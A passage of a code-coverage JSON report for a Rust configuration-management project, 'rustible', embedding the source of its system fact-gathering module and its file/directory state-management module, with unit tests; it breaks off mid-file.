:390,"address":[24894771],"length":1,"stats":{"Line":0}},{"line":391,"address":[24895737],"length":1,"stats":{"Line":0}},{"line":392,"address":[24895786],"length":1,"stats":{"Line":0}},{"line":394,"address":[26102463],"length":1,"stats":{"Line":0}},{"line":396,"address":[24896483,24896573,24892680,24896521,24892739,24892815],"length":1,"stats":{"Line":0}},{"line":397,"address":[24896300],"length":1,"stats":{"Line":0}},{"line":398,"address":[24896349],"length":1,"stats":{"Line":0}},{"line":399,"address":[24896398],"length":1,"stats":{"Line":0}},{"line":401,"address":[26102478],"length":1,"stats":{"Line":0}},{"line":402,"address":[24892880],"length":1,"stats":{"Line":0}},{"line":404,"address":[24892915],"length":1,"stats":{"Line":0}},{"line":406,"address":[24892961],"length":1,"stats":{"Line":0}},{"line":407,"address":[24893911,24894289],"length":1,"stats":{"Line":0}},{"line":408,"address":[24894467],"length":1,"stats":{"Line":0}},{"line":410,"address":[24893976,24893857],"length":1,"stats":{"Line":0}},{"line":411,"address":[24894111],"length":1,"stats":{"Line":0}},{"line":415,"address":[24892984],"length":1,"stats":{"Line":0}},{"line":416,"address":[24893493,24893052],"length":1,"stats":{"Line":0}},{"line":417,"address":[24893671],"length":1,"stats":{"Line":0}},{"line":419,"address":[24892998,24893161],"length":1,"stats":{"Line":0}},{"line":420,"address":[24893296],"length":1,"stats":{"Line":0}},{"line":426,"address":[24895180,24895235],"length":1,"stats":{"Line":0}},{"line":427,"address":[24894809,24894912,24895008],"length":1,"stats":{"Line":0}},{"line":428,"address":[24895107,24895016],"length":1,"stats":{"Line":0}},{"line":433,"address":[31277334],"length":1,"stats":{"Line":0}},{"line":438,"address":[31288656,31289003,31289009],"length":1,"stats":{"Line":1}},{"line":440,"address":[31288740,31288715],"length":1,"stats":{"Line":2}},{"line":441,"address":[24908172,24908144],"length":1,"stats":{"Line":3}},{"line":443,"address":[31288841],"length":1,"stats":{"Line":1}},{"line":445,"address":[31288852,31288754],"length":1,"stats":{"Line":1}}],"covered":15,"coverable":202},{"path":["/","home","artur","Repositories","rustible","src","modules","facts.rs"],"content":"//! Facts module - System fact gathering\n//!\n//! This module gathers facts about the target system including OS, hardware,\n//! network, and other system information.\n\nuse super::{\n    Module, ModuleContext, ModuleError, ModuleOutput, ModuleParams, ModuleResult, ParamExt,\n};\nuse std::collections::HashMap;\nuse std::fs;\nuse std::process::Command;\n\n/// Module for gathering system facts\npub struct FactsModule;\n\nimpl FactsModule {\n    fn gather_os_facts() -\u003e HashMap\u003cString, serde_json::Value\u003e {\n        let mut facts = HashMap::new();\n\n        // Get hostname\n        if let Ok(output) = Command::new(\"hostname\").arg(\"-f\").output() {\n            if output.status.success() {\n                let hostname = String::from_utf8_lossy(\u0026output.stdout).trim().to_string();\n                facts.insert(\"hostname\".to_string(), serde_json::json!(hostname));\n\n                // Also get short hostname\n                if let Some(short) = hostname.split('.').next() {\n                    facts.insert(\"hostname_short\".to_string(), serde_json::json!(short));\n                }\n            }\n        }\n\n        // Get kernel info via uname\n        if let Ok(output) = Command::new(\"uname\").arg(\"-s\").output() {\n            if output.status.success() {\n                facts.insert(\n                    \"system\".to_string(),\n                    serde_json::json!(String::from_utf8_lossy(\u0026output.stdout).trim()),\n                );\n            }\n        }\n\n        if let Ok(output) = Command::new(\"uname\").arg(\"-r\").output() {\n            if output.status.success() {\n                facts.insert(\n                    \"kernel\".to_string(),\n                    serde_json::json!(String::from_utf8_lossy(\u0026output.stdout).trim()),\n                );\n            }\n        }\n\n        if let Ok(output) = Command::new(\"uname\").arg(\"-m\").output() {\n            if output.status.success() {\n                let arch = String::from_utf8_lossy(\u0026output.stdout).trim().to_string();\n                facts.insert(\"architecture\".to_string(), serde_json::json!(arch));\n\n                // Map to common architecture names\n                let machine = match arch.as_str() {\n                    \"x86_64\" | \"amd64\" =\u003e \"x86_64\",\n                    \"aarch64\" | \"arm64\" =\u003e \"aarch64\",\n                    \"armv7l\" =\u003e \"armv7l\",\n                    \"i686\" | \"i386\" =\u003e \"i386\",\n                    _ =\u003e \u0026arch,\n                };\n                facts.insert(\"machine\".to_string(), serde_json::json!(machine));\n            }\n        }\n\n        // Get OS release info\n        if let Ok(content) = fs::read_to_string(\"/etc/os-release\") {\n            for line in content.lines() {\n                if let Some((key, value)) = line.split_once('=') {\n                    let value = value.trim_matches('\"');\n                    match key {\n                        \"ID\" =\u003e {\n                            facts.insert(\"distribution\".to_string(), serde_json::json!(value));\n                        }\n                        \"VERSION_ID\" =\u003e {\n                            facts.insert(\n                                \"distribution_version\".to_string(),\n                                serde_json::json!(value),\n                            );\n                        }\n                        \"ID_LIKE\" =\u003e {\n                            facts.insert(\"os_family\".to_string(), serde_json::json!(value));\n                        }\n                        \"PRETTY_NAME\" =\u003e {\n                            facts.insert(\n                                \"distribution_pretty_name\".to_string(),\n                                serde_json::json!(value),\n                            );\n                        }\n                        \"VERSION_CODENAME\" =\u003e {\n                            facts.insert(\n                                \"distribution_codename\".to_string(),\n                                serde_json::json!(value),\n                            );\n                        }\n                        _ =\u003e {}\n                    }\n                }\n            }\n        }\n\n        // Determine OS family if not set\n        if !facts.contains_key(\"os_family\") {\n            if let Some(serde_json::Value::String(distro)) = facts.get(\"distribution\") {\n                let family = match distro.to_lowercase().as_str() {\n                    \"ubuntu\" | \"debian\" | \"linuxmint\" | \"pop\" | \"elementary\" =\u003e \"debian\",\n                    \"fedora\" | \"centos\" | \"rhel\" | \"rocky\" | \"alma\" | \"oracle\" =\u003e \"redhat\",\n                    \"arch\" | \"manjaro\" | \"endeavouros\" =\u003e \"arch\",\n                    \"opensuse\" | \"sles\" =\u003e \"suse\",\n                    \"alpine\" =\u003e \"alpine\",\n                    \"gentoo\" =\u003e \"gentoo\",\n                    _ =\u003e \"unknown\",\n                };\n                facts.insert(\"os_family\".to_string(), serde_json::json!(family));\n            }\n        }\n\n        // Get current user\n        if let Ok(output) = Command::new(\"whoami\").output() {\n            if output.status.success() {\n                facts.insert(\n                    \"user_id\".to_string(),\n                    serde_json::json!(String::from_utf8_lossy(\u0026output.stdout).trim()),\n                );\n            }\n        }\n\n        // Get user's UID\n        if let Ok(output) = Command::new(\"id\").arg(\"-u\").output() {\n            if output.status.success() {\n                if let Ok(uid) = String::from_utf8_lossy(\u0026output.stdout)\n                    .trim()\n                    .parse::\u003cu32\u003e()\n                {\n                    facts.insert(\"user_uid\".to_string(), serde_json::json!(uid));\n                }\n            }\n        }\n\n        // Get user's GID\n        if let Ok(output) = Command::new(\"id\").arg(\"-g\").output() {\n            if output.status.success() {\n                if let Ok(gid) = String::from_utf8_lossy(\u0026output.stdout)\n                    .trim()\n                    .parse::\u003cu32\u003e()\n                {\n                    facts.insert(\"user_gid\".to_string(), serde_json::json!(gid));\n                }\n            }\n        }\n\n        facts\n    }\n\n    fn gather_hardware_facts() -\u003e HashMap\u003cString, serde_json::Value\u003e {\n        let mut facts = HashMap::new();\n\n        // Get CPU info\n        if let Ok(content) = fs::read_to_string(\"/proc/cpuinfo\") {\n            let mut processor_count = 0;\n            let mut model_name = String::new();\n            let mut cpu_cores = 0;\n\n            for line in content.lines() {\n                if line.starts_with(\"processor\") {\n                    processor_count += 1;\n                } else if line.starts_with(\"model name\") {\n                    if let Some((_, value)) = line.split_once(':') {\n                        model_name = value.trim().to_string();\n                    }\n                } else if line.starts_with(\"cpu cores\") {\n                    if let Some((_, value)) = line.split_once(':') {\n                        cpu_cores = value.trim().parse().unwrap_or(0);\n                    }\n                }\n            }\n\n            facts.insert(\n                \"processor_count\".to_string(),\n                serde_json::json!(processor_count),\n            );\n            if !model_name.is_empty() {\n                facts.insert(\"processor\".to_string(), serde_json::json!(model_name));\n            }\n            if cpu_cores \u003e 0 {\n                facts.insert(\"processor_cores\".to_string(), serde_json::json!(cpu_cores));\n            }\n        }\n\n        // Get memory info\n        if let Ok(content) = fs::read_to_string(\"/proc/meminfo\") {\n            for line in content.lines() {\n                if line.starts_with(\"MemTotal:\") {\n                    if let Some(kb_str) = line.split_whitespace().nth(1) {\n                        if let Ok(kb) = kb_str.parse::\u003cu64\u003e() {\n                            facts.insert(\"memtotal_mb\".to_string(), serde_json::json!(kb / 1024));\n                        }\n                    }\n                } else if line.starts_with(\"MemFree:\") {\n                    if let Some(kb_str) = line.split_whitespace().nth(1) {\n                        if let Ok(kb) = kb_str.parse::\u003cu64\u003e() {\n                            facts.insert(\"memfree_mb\".to_string(), serde_json::json!(kb / 1024));\n                        }\n                    }\n                } else if line.starts_with(\"SwapTotal:\") {\n                    if let Some(kb_str) = line.split_whitespace().nth(1) {\n                        if let Ok(kb) = kb_str.parse::\u003cu64\u003e() {\n                            facts.insert(\"swaptotal_mb\".to_string(), serde_json::json!(kb / 1024));\n                        }\n                    }\n                }\n            }\n        }\n\n        // Get disk info - root filesystem\n        if let Ok(output) = Command::new(\"df\").args([\"-B1\", \"/\"]).output() {\n            if output.status.success() {\n                let stdout = String::from_utf8_lossy(\u0026output.stdout);\n                if let Some(line) = stdout.lines().nth(1) {\n                    let parts: Vec\u003c\u0026str\u003e = line.split_whitespace().collect();\n                    if parts.len() \u003e= 4 {\n                        if let Ok(total) = parts[1].parse::\u003cu64\u003e() {\n                            facts.insert(\"disk_total_bytes\".to_string(), serde_json::json!(total));\n                        }\n                        if let Ok(used) = parts[2].parse::\u003cu64\u003e() {\n                            facts.insert(\"disk_used_bytes\".to_string(), serde_json::json!(used));\n                        }\n                        if let Ok(avail) = parts[3].parse::\u003cu64\u003e() {\n                            facts.insert(\n                                \"disk_available_bytes\".to_string(),\n                                serde_json::json!(avail),\n                            );\n                        }\n                    }\n                }\n            }\n        }\n\n        facts\n    }\n\n    fn gather_network_facts() -\u003e HashMap\u003cString, serde_json::Value\u003e {\n        let mut facts = HashMap::new();\n        let mut interfaces: Vec\u003cserde_json::Value\u003e = Vec::new();\n\n        // Get network interfaces\n        if let Ok(entries) = fs::read_dir(\"/sys/class/net\") {\n            for entry in entries.filter_map(|e| e.ok()) {\n                let iface_name = entry.file_name().to_string_lossy().to_string();\n\n                // Skip loopback\n                if iface_name == \"lo\" {\n                    continue;\n                }\n\n                let mut iface_info = serde_json::Map::new();\n                iface_info.insert(\"device\".to_string(), serde_json::json!(iface_name.clone()));\n\n                // Get MAC address\n                let mac_path = entry.path().join(\"address\");\n                if let Ok(mac) = fs::read_to_string(\u0026mac_path) {\n                    let mac = mac.trim();\n                    if mac != \"00:00:00:00:00:00\" {\n                        iface_info.insert(\"macaddress\".to_string(), serde_json::json!(mac));\n                    }\n                }\n\n                // Get MTU\n                let mtu_path = entry.path().join(\"mtu\");\n                if let Ok(mtu) = fs::read_to_string(\u0026mtu_path) {\n                    if let Ok(mtu) = mtu.trim().parse::\u003cu32\u003e() {\n                        iface_info.insert(\"mtu\".to_string(), serde_json::json!(mtu));\n                    }\n                }\n\n                // Get operstate\n                let state_path = entry.path().join(\"operstate\");\n                if let Ok(state) = fs::read_to_string(\u0026state_path) {\n                    iface_info.insert(\n                        \"active\".to_string(),\n                        serde_json::json!(state.trim() == \"up\"),\n                    );\n                }\n\n                interfaces.push(serde_json::Value::Object(iface_info));\n            }\n        }\n\n        facts.insert(\"interfaces\".to_string(), serde_json::json!(interfaces));\n\n        // Get default IPv4 address\n        if let Ok(output) = Command::new(\"ip\")\n            .args([\"route\", \"get\", \"1.1.1.1\"])\n            .output()\n        {\n            if output.status.success() {\n                let stdout = String::from_utf8_lossy(\u0026output.stdout);\n                for part in stdout.split_whitespace() {\n                    // Look for src keyword followed by IP\n                    if part == \"src\" {\n                        if let Some(ip) = stdout.split(\"src \").nth(1) {\n                            if let Some(ip) = ip.split_whitespace().next() {\n                                facts.insert(\"default_ipv4\".to_string(), serde_json::json!(ip));\n                                break;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n\n        // Get FQDN\n        if let Ok(output) = Command::new(\"hostname\").arg(\"-f\").output() {\n            if output.status.success() {\n                facts.insert(\n                    \"fqdn\".to_string(),\n                    serde_json::json!(String::from_utf8_lossy(\u0026output.stdout).trim()),\n                );\n            }\n        }\n\n        facts\n    }\n\n    fn gather_date_facts() -\u003e HashMap\u003cString, serde_json::Value\u003e {\n        let mut facts = HashMap::new();\n\n        // Get current date/time info\n        if let Ok(output) = Command::new(\"date\").arg(\"+%Y-%m-%d %H:%M:%S %Z\").output() {\n            if output.status.success() {\n                facts.insert(\n                    \"date_time\".to_string(),\n                    serde_json::json!(String::from_utf8_lossy(\u0026output.stdout).trim()),\n                );\n            }\n        }\n\n        // Get epoch\n        if let Ok(output) = Command::new(\"date\").arg(\"+%s\").output() {\n            if output.status.success() {\n                if let Ok(epoch) = String::from_utf8_lossy(\u0026output.stdout)\n                    .trim()\n                    .parse::\u003cu64\u003e()\n                {\n                    facts.insert(\"epoch\".to_string(), serde_json::json!(epoch));\n                }\n            }\n        }\n\n        // Get timezone\n        if let Ok(tz) = fs::read_to_string(\"/etc/timezone\") {\n            facts.insert(\"timezone\".to_string(), serde_json::json!(tz.trim()));\n        } else if let Ok(link) = fs::read_link(\"/etc/localtime\") {\n            // Extract timezone from symlink path\n            let path = link.to_string_lossy();\n            if let Some(tz) = path.strip_prefix(\"/usr/share/zoneinfo/\") {\n                facts.insert(\"timezone\".to_string(), serde_json::json!(tz));\n            }\n        }\n\n        // Get uptime\n        if let Ok(content) = fs::read_to_string(\"/proc/uptime\") {\n            if let Some(seconds_str) = content.split_whitespace().next() {\n                if let Ok(seconds) = seconds_str.parse::\u003cf64\u003e() {\n                    facts.insert(\n                        \"uptime_seconds\".to_string(),\n                        serde_json::json!(seconds as u64),\n                    );\n                }\n            }\n        }\n\n        facts\n    }\n\n    fn gather_env_facts() -\u003e HashMap\u003cString, serde_json::Value\u003e {\n        let mut facts = HashMap::new();\n        let mut env_vars = serde_json::Map::new();\n\n        // Get important environment variables\n        for (key, value) in std::env::vars() {\n            match key.as_str() {\n                \"PATH\" | \"HOME\" | \"USER\" | \"SHELL\" | \"LANG\" | \"LC_ALL\" | \"TERM\" | \"PWD\" =\u003e {\n                    env_vars.insert(key, serde_json::json!(value));\n                }\n                _ =\u003e {}\n            }\n        }\n\n        facts.insert(\"env\".to_string(), serde_json::Value::Object(env_vars));\n\n        // Get Python version if available\n        if let Ok(output) = Command::new(\"python3\").arg(\"--version\").output() {\n            if output.status.success() {\n                let version = String::from_utf8_lossy(\u0026output.stdout);\n                if let Some(ver) = version.strip_prefix(\"Python \") {\n                    facts.insert(\"python_version\".to_string(), serde_json::json!(ver.trim()));\n                }\n            }\n        }\n\n        facts\n    }\n}\n\nimpl Module for FactsModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"gather_facts\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Gather facts about the target system\"\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let gather_subset = params\n            .get_vec_string(\"gather_subset\")?\n            .unwrap_or_else(|| vec![\"all\".to_string()]);\n\n        let gather_all = gather_subset.contains(\u0026\"all\".to_string());\n\n        let mut all_facts = HashMap::new();\n\n        // Always gather OS facts\n        if gather_all\n            || gather_subset.contains(\u0026\"os\".to_string())\n            || gather_subset.contains(\u0026\"min\".to_string())\n        {\n            for (k, v) in Self::gather_os_facts() {\n                all_facts.insert(k, v);\n            }\n        }\n\n        // Gather hardware facts\n        if gather_all || gather_subset.contains(\u0026\"hardware\".to_string()) {\n            for (k, v) in Self::gather_hardware_facts() {\n                all_facts.insert(k, v);\n            }\n        }\n\n        // Gather network facts\n        if gather_all || gather_subset.contains(\u0026\"network\".to_string()) {\n            for (k, v) in Self::gather_network_facts() {\n                all_facts.insert(k, v);\n            }\n        }\n\n        // Gather date/time facts\n        if gather_all || gather_subset.contains(\u0026\"date_time\".to_string()) {\n            for (k, v) in Self::gather_date_facts() {\n                all_facts.insert(k, v);\n            }\n        }\n\n        // Gather environment facts\n        if gather_all || gather_subset.contains(\u0026\"env\".to_string()) {\n            for (k, v) in Self::gather_env_facts() {\n                all_facts.insert(k, v);\n            }\n        }\n\n        // Convert to serde_json::Value\n        let facts_json: serde_json::Map\u003cString, serde_json::Value\u003e =\n            all_facts.into_iter().collect();\n\n        let _ = context;\n\n        Ok(ModuleOutput::ok(\"Facts gathered successfully\")\n            .with_data(\"ansible_facts\", serde_json::Value::Object(facts_json)))\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Fact gathering is read-only, so check mode behaves the same\n        self.execute(params, context)\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_gather_os_facts() {\n        let facts = FactsModule::gather_os_facts();\n\n        // Should always have some OS facts on Linux\n        assert!(facts.contains_key(\"system\") || facts.contains_key(\"hostname\"));\n    }\n\n    #[test]\n    fn test_gather_hardware_facts() {\n        let facts = FactsModule::gather_hardware_facts();\n\n        // Should have processor count on Linux\n        if std::path::Path::new(\"/proc/cpuinfo\").exists() {\n            assert!(facts.contains_key(\"processor_count\"));\n        }\n    }\n\n    #[test]\n    fn test_gather_network_facts() {\n        let facts = FactsModule::gather_network_facts();\n\n        // Should have interfaces on Linux\n        if std::path::Path::new(\"/sys/class/net\").exists() {\n            assert!(facts.contains_key(\"interfaces\"));\n        }\n    }\n\n    #[test]\n    fn test_facts_module_execute() {\n        let module = FactsModule;\n        let params: ModuleParams = HashMap::new();\n        let context = ModuleContext::default();\n\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert!(result.data.contains_key(\"ansible_facts\"));\n    }\n\n    #[test]\n    fn test_facts_module_with_subset() {\n        let module = FactsModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"gather_subset\".to_string(),\n            serde_json::json!([\"os\", \"hardware\"]),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert!(result.data.contains_key(\"ansible_facts\"));\n    }\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","src","modules","file.rs"],"content":"//! File module - File/directory state management\n//!\n//! This module manages file and directory state including creation, deletion,\n//! permissions, ownership, and symbolic links.\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParamExt,\n};\nuse std::fs;\nuse std::os::unix::fs::{symlink, MetadataExt, PermissionsExt};\nuse std::path::Path;\n\n/// Desired state for a file/directory\n#[derive(Debug, Clone, PartialEq)]\npub enum FileState {\n    /// File should exist\n    File,\n    /// Directory should exist\n    Directory,\n    /// Symbolic link should exist\n    Link,\n    /// Hard link should exist\n    Hard,\n    /// Path should not exist\n    Absent,\n    /// Only update attributes (touch)\n    Touch,\n}\n\nimpl FileState {\n    fn from_str(s: \u0026str) -\u003e ModuleResult\u003cSelf\u003e {\n        match s.to_lowercase().as_str() {\n            \"file\" =\u003e Ok(FileState::File),\n            \"directory\" | \"dir\" =\u003e Ok(FileState::Directory),\n            \"link\" | \"symlink\" =\u003e Ok(FileState::Link),\n            \"hard\" | \"hardlink\" =\u003e Ok(FileState::Hard),\n            \"absent\" =\u003e Ok(FileState::Absent),\n            \"touch\" =\u003e Ok(FileState::Touch),\n            _ =\u003e Err(ModuleError::InvalidParameter(format!(\n                \"Invalid state '{}'. Valid states: file, directory, link, hard, absent, touch\",\n                s\n            ))),\n        }\n    }\n}\n\n/// Module for file/directory management\npub struct FileModule;\n\nimpl FileModule {\n    fn get_current_state(path: \u0026Path) -\u003e Option\u003cFileState\u003e {\n        if !path.exists() \u0026\u0026 !path.is_symlink() {\n            return None;\n        }\n\n        let meta = match path.symlink_metadata() {\n            Ok(m) =\u003e m,\n            Err(_) =\u003e return None,\n        };\n\n        if meta.file_type().is_symlink() {\n            Some(FileState::Link)\n        } else if meta.is_dir() {\n            Some(FileState::Directory)\n        } else if meta.is_file() {\n            Some(FileState::File)\n        } else {\n            None\n        }\n    }\n\n    fn set_permissions(path: \u0026Path, mode: u32) -\u003e ModuleResult\u003cbool\u003e {\n        let meta = fs::symlink_metadata(path)?;\n\n        // Don't change permissions on symlinks\n        if meta.file_type().is_symlink() {\n            return Ok(false);\n        }\n\n        let current = meta.permissions().mode() \u0026 0o7777;\n        if current != mode {\n            fs::set_permissions(path, fs::Permissions::from_mode(mode))?;\n            return Ok(true);\n        }\n        Ok(false)\n    }\n\n    fn set_owner(path: \u0026Path, owner: Option\u003cu32\u003e, group: Option\u003cu32\u003e) -\u003e ModuleResult\u003cbool\u003e {\n        use std::os::unix::fs::chown;\n\n        let meta = fs::symlink_metadata(path)?;\n        let current_uid = meta.uid();\n        let current_gid = meta.gid();\n\n        let new_uid = owner.unwrap_or(current_uid);\n        let new_gid = group.unwrap_or(current_gid);\n\n        if current_uid != new_uid || current_gid != new_gid {\n            chown(path, Some(new_uid), Some(new_gid))?;\n            return Ok(true);\n        }\n        Ok(false)\n    }\n\n    fn create_directory(path: \u0026Path, mode: Option\u003cu32\u003e, recurse: bool) -\u003e ModuleResult\u003cbool\u003e {\n        if path.exists() {\n            if path.is_dir() {\n                return Ok(false);\n            } else {\n                return Err(ModuleError::ExecutionFailed(format!(\n                    \"Path '{}' exists but is not a directory\",\n                    path.display()\n                )));\n            }\n        }\n\n        if recurse {\n            fs::create_dir_all(path)?;\n        } else {\n            fs::create_dir(path)?;\n        }\n\n        if let Some(mode) = mode {\n            fs::set_permissions(path, fs::Permissions::from_mode(mode))?;\n        }\n\n        Ok(true)\n    }\n\n    fn create_file(path: \u0026Path, mode: Option\u003cu32\u003e) -\u003e ModuleResult\u003cbool\u003e {\n        if path.exists() {\n            if path.is_file() {\n                return Ok(false);\n            } else {\n                return Err(ModuleError::ExecutionFailed(format!(\n                    \"Path '{}' exists but is not a file\",\n                    path.display()\n                )));\n            }\n        }\n\n        // Create parent directories if needed\n        if let Some(parent) = path.parent() {\n            if !parent.exists() {\n                fs::create_dir_all(parent)?;\n            }\n        }\n\n        fs::File::create(path)?;\n\n        if let Some(mode) = mode {\n            fs::set_permissions(path, fs::Permissions::from_mode(mode))?;\n        }\n\n        Ok(true)\n    }\n\n    fn create_symlink(src: \u0026Path, dest: \u0026Path, force: bool) -\u003e ModuleResult\u003cbool\u003e {\n        // Check if symlink already exists and points to correct target\n        if dest.is_symlink() {\n            if let Ok(target) = fs::read_link(dest) {\n                if target == src {\n                    return Ok(false);\n                }\n            }\n            if force {\n                fs::remove_file(dest)?;\n            } else {\n                return Err(ModuleError::ExecutionFailed(format!(\n                    \"Symlink '{}' already exists with different target\",\n                    dest.display()\n                )));\n            }\n        } else if dest.exists() {\n            if force {\n                if dest.is_dir() {\n                    fs::remove_dir_all(dest)?;\n                } else {\n                    fs::remove_file(dest)?;\n                }\n            } else {\n                return Err(ModuleError::ExecutionFailed(format!(\n                    \"Path '{}' already exists and is not a symlink\",\n                    dest.display()\n                )));\n            }\n        }\n\n        // Create parent directories if needed\n        if let Some(parent) = dest.parent() {\n            if !parent.exists() {\n                fs::create_dir_all(parent)?;\n            }\n        }\n\n        symlink(src, dest)?;\n        Ok(true)\n    }\n\n    fn create_hardlink(src: \u0026Path, dest: \u0026Path, force: bool) -\u003e ModuleResult\u003cbool\u003e {\n        if !src.exists() {\n            return Err(ModuleError::ExecutionFailed(format!(\n                \"Source '{}' does not exist\",\n                src.display()\n            )));\n        }\n\n        // Check if hardlink already exists\n        if dest.exists() {\n            let src_meta = fs::metadata(src)?;\n            let dest_meta = fs::metadata(dest)?;\n\n            // Same inode means same file (hardlink already exists)\n            if src_meta.ino() == dest_meta.ino() \u0026\u0026 src_meta.dev() == dest_meta.dev() {\n                return Ok(false);\n            }\n\n            if force {\n                fs::remove_file(dest)?;\n            } else {\n                return Err(ModuleError::ExecutionFailed(format!(\n                    \"Path '{}' already exists\",\n                    dest.display()\n                )));\n            }\n        }\n\n        // Create parent directories if needed\n        if let Some(parent) = dest.parent() {\n            if !parent.exists() {\n                fs::create_dir_all(parent)?;\n            }\n        }\n\n        fs::hard_link(src, dest)?;\n        Ok(true)\n    }\n\n    fn remove_path(path: \u0026Path, recurse: bool) -\u003e ModuleResult\u003cbool\u003e {\n        if !path.exists() \u0026\u0026 !path.is_symlink() {\n            return Ok(false);\n        }\n\n        let meta = fs::symlink_metadata(path)?;\n\n        if meta.is_dir() {\n            if recurse {\n                fs::remove_dir_all(path)?;\n            } else {\n                fs::remove_dir(path)?;\n            }\n        } else {\n            fs::remove_file(path)?;\n        }\n\n        Ok(true)\n    }\n\n    fn touch_file(path: \u0026Path) -\u003e ModuleResult\u003cbool\u003e {\n        use std::time::SystemTime;\n\n        if !path.exists() {\n            // Create the file\n            fs::File::create(path)?;\n            return Ok(true);\n        }\n\n        // Update access and modification times\n        let now = SystemTime::now();\n        filetime::set_file_mtime(path, filetime::FileTime::from_system_time(now))?;\n        filetime::set_file_atime(path, filetime::FileTime::from_system_time(now))?;\n\n        Ok(true)\n    }\n}\n\nimpl Module for FileModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"file\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Manage file and directory state\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::NativeTransport\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"path\"]\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        let path_str = params.get_string_required(\"path\")?;\n        let path = Path::new(\u0026path_str);\n        let state_str = params\n            .get_string(\"state\")?\n            .unwrap_or_else(|| \"file\".to_string());\n        let state = FileState::from_str(\u0026state_str)?;\n        let mode = params.get_u32(\"mode\")?;\n        let owner = params.get_u32(\"owner\")?;\n        let group = params.get_u32(\"group\")?;\n        let recurse = params.get_bool_or(\"recurse\", false);\n        let force = params.get_bool_or(\"force\", false);\n        let src = params.get_string(\"src\")?;\n\n        let current_state = Self::get_current_state(path);\n\n        // Handle each state\n        match state {\n            FileState::Absent =\u003e {\n                if current_state.is_none() {\n                    return Ok(ModuleOutput::ok(format!(\n                        \"Path '{}' already absent\",\n                        path_str\n                    )));\n                }\n\n                if context.check_mode {\n                    return Ok(\n                        ModuleOutput::changed(format!(\"Would remove '{}'\", path_str))\n                            .with_diff(Diff::new(format!(\"{:?}\", current_state), \"absent\")),\n                    );\n                }\n\n                Self::remove_path(path, recurse)?;\n                Ok(ModuleOutput::changed(format!(\"Removed '{}'\", path_str)))\n            }\n\n            FileState::Directory =\u003e {\n                if context.check_mode {\n                    if current_state == Some(FileState::Directory) {\n                        // Check if permissions need changing\n                        if mode.is_some() || owner.is_some() || group.is_some() {\n                            return Ok(ModuleOutput::changed(format!(\n                                \"Would update attributes on '{}'\",\n                                path_str\n                            )));\n                        }\n                        return Ok(ModuleOutput::ok(format!(\n                            \"Directory '{}' already exists\",\n                            path_str\n                        )));\n                    }\n                    return Ok(ModuleOutput::changed(format!(\n                        \"Would create directory '{}'\",\n                        path_str\n                    )));\n                }\n\n                let created = Self::create_directory(path, mode, recurse)?;\n                let perm_changed = if let Some(m) = mode {\n                    Self::set_permissions(path, m)?\n                } else {\n                    false\n                };\n                let owner_changed = Self::set_owner(path, owner, group)?;\n\n                if created {\n                    Ok(ModuleOutput::changed(format!(\n                        \"Created directory '{}'\",\n                        path_str\n                    )))\n                } else if perm_changed || owner_changed {\n                    Ok(ModuleOutput::changed(format!(\n                        \"Updated attributes on directory '{}'\",\n                        path_str\n                    )))\n                } else {\n                    Ok(ModuleOutput::ok(format!(\n                        \"Directory '{}' already exists with correct attributes\",\n                        path_str\n                    )))\n                }\n            }\n\n            FileState::File =\u003e {\n                if context.check_mode {\n                    if current_state == Some(FileState::File) {\n                        if mode.is_some() || owner.is_some() || group.is_some() {\n                            return Ok(ModuleOutput::changed(format!(\n                                \"Would update attributes on '{}'\",\n                                path_str\n                            )));\n                        }\n                        return Ok(ModuleOutput::ok(format!(\n                            \"File '{}' already exists\",\n                            path_str\n                        )));\n                    }\n                    return Ok(ModuleOutput::changed(format!(\n                        \"Would create file '{}'\",\n                        path_str\n                    )));\n                }\n\n                let created = Self::create_file(path, mode)?;\n                let perm_changed = if let Some(m) = mode {\n                    Self::set_permissions(path, m)?\n                } else {\n                    false\n                };\n                let owner_changed = Self::set_owner(path, owner, group)?;\n\n                if created {\n                    Ok(ModuleOutput::changed(format!(\n                        \"Created file '{}'\",\n                        path_str\n                    )))\n                } else if perm_changed || owner_changed {\n                    Ok(ModuleOutput::changed(format!(\n                        \"Updated attributes on file '{}'\",\n                        path_str\n                    )))\n                } else {\n                    Ok(ModuleOutput::ok(format!(\n                        \"File '{}' already exists with correct attributes\",\n                        path_str\n                    )))\n                }\n            }\n\n            FileState::Link =\u003e {\n                let src = src.ok_or_else(|| {\n                    ModuleError::MissingParameter(\"src is required for symlinks\".to_string())\n                })?;\n                let src_path = Path::new(\u0026src);\n\n                if context.check_mode {\n                    if current_state == Some(FileState::Link) {\n                        if let Ok(target) = fs::read_link(path) {\n                            if target == src_path {\n                                return Ok(ModuleOutput::ok(format!(\n                                    \"Symlink '{}' already points to '{}'\",\n                                    path_str, src\n                                )));\n                            }\n                        }\n                    }\n                    return Ok(ModuleOutput::changed(format!(\n                        \"Would create symlink '{}' -\u003e '{}'\",\n                        path_str, src\n                    )));\n                }\n\n                let created = Self::create_symlink(src_path, path, force)?;\n\n                if created {\n                    Ok(ModuleOutput::changed(format!(\n                        \"Created symlink '{}' -\u003e 